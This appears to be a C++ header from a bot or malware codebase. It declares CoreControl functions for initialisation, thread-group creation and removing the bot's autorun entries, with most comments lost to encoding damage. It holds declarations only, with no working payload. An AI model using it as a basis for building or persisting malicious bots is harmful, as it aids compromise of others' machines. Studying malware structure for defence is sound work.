/*
  ������ �������� ��������� ����.
*/
#pragma once

#include "..\common\threadsgroup.h"

namespace CoreControl
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    �������� �������.

    IN OUT group - ������ �������, � ������� ����� ������������ ������ �������.
    
    Return       - true - � ������ ������,
                   false - � ������ ������.
  */
  bool _create(ThreadsGroup::GROUP *group);

  /*    Clear all values ​​from the system created by the bot to auto.
    
    Return - true - if successful,
             false - if an error occurs.
  */
  bool _removeAutorun(void);
};
